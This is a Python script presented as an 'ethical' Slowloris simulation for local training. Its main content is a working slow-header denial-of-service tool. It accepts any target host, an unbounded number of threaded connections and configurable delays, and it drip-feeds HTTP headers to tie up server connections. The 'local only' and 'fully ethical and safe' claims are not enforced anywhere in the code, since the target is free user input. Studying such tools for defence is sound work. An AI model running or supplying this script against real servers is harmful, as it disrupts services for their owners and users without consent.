# ===============================================
# Ethical Slowloris Simulation Tool (Local Only)
# Author: Md Abdullah
# Purpose: Web testing / Learning / Defensive Training
# Interactive version: All inputs from user
# ===============================================

import socket
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

# =========================
# 1️⃣ Localhost Test Server
# =========================
class SafeHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Hello! This is a safe local test server.")

def run_server(port):
    server_address = ('localhost', port)
    httpd = HTTPServer(server_address, SafeHandler)
    print(f"[INFO] Safe local server running at http://localhost:{port}")
    httpd.serve_forever()

# Ask user if they want to run a local server
run_local = input("Do you want to run a local test server? (y/n): ").strip().lower()
if run_local == 'y':
    port_input = input("Enter port for local server (e.g., 8080): ").strip()
    try:
        server_port = int(port_input)
    except:
        print("Invalid port, using default 8080")
        server_port = 8080

    server_thread = threading.Thread(target=run_server, args=(server_port,), daemon=True)
    server_thread.start()
    time.sleep(1)
    print(f"[INFO] Local server started on port {server_port}")
else:
    server_port = None
    print("[INFO] Skipping local server.")

# ================================
# 2️⃣ User Configurable Settings
# ================================
HOST = input("Enter target IP or hostname (use 'localhost' for local testing): ").strip()

PORT_input = input("Enter target port (e.g., 8080): ").strip()
try:
    PORT = int(PORT_input)
except:
    print("Invalid port, using default 8080")
    PORT = 8080

NUM_CONNECTIONS_input = input("Enter number of simulated connections (e.g., 5): ").strip()
try:
    NUM_CONNECTIONS = int(NUM_CONNECTIONS_input)
except:
    print("Invalid input, using default 5")
    NUM_CONNECTIONS = 5

SLOW_DELAY_input = input("Enter delay between header lines in seconds (e.g., 2): ").strip()
try:
    SLOW_DELAY = float(SLOW_DELAY_input)
except:
    print("Invalid input, using default 2 seconds")
    SLOW_DELAY = 2

STAGGER_DELAY_input = input("Enter delay between thread start in seconds (e.g., 0.5): ").strip()
try:
    STAGGER_DELAY = float(STAGGER_DELAY_input)
except:
    print("Invalid input, using default 0.5 seconds")
    STAGGER_DELAY = 0.5

# Ask user for custom headers
CUSTOM_HEADERS = {}
while True:
    add_header = input("Do you want to add a custom header? (y/n): ").strip().lower()
    if add_header != 'y':
        break
    key = input("Header Name: ").strip()
    value = input("Header Value: ").strip()
    if key:
        CUSTOM_HEADERS[key] = value

if not CUSTOM_HEADERS:
    CUSTOM_HEADERS = {"User-Agent": "EthicalWebTester", "X-Custom-Header": "LocalLab"}

# For logging results
logs = []

# ================================
# 3️⃣ Slow request function
# ================================
def slow_request(thread_id, host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        logs.append(f"[Thread-{thread_id}] Connected successfully to {host}:{port}")

        # Send initial GET line
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(f"Host: {host}\r\n".encode())

        # Send headers slowly
        for key, value in CUSTOM_HEADERS.items():
            s.send(f"{key}: {value}\r\n".encode())
            logs.append(f"[Thread-{thread_id}] Sent header: {key}")
            time.sleep(SLOW_DELAY)

        s.send(b"\r\n")  # finish request
        logs.append(f"[Thread-{thread_id}] Request finished safely")
        s.close()

    except Exception as e:
        logs.append(f"[Thread-{thread_id}] Error: {e}")

# ================================
# 4️⃣ Run multiple slow requests safely
# ================================
threads = []
for i in range(NUM_CONNECTIONS):
    t = threading.Thread(target=slow_request, args=(i+1, HOST, PORT))
    threads.append(t)
    t.start()
    time.sleep(STAGGER_DELAY)

for t in threads:
    t.join()

# ================================
# 5️⃣ Show summary of the simulation
# ================================
print("\n✅ Safe Slowloris Simulation Complete!")
print("Summary of threads activity:\n")
for log in logs:
    print(log)

print("\n⚠️ Reminder: Always use localhost / private lab. This tool is fully ethical and safe.")
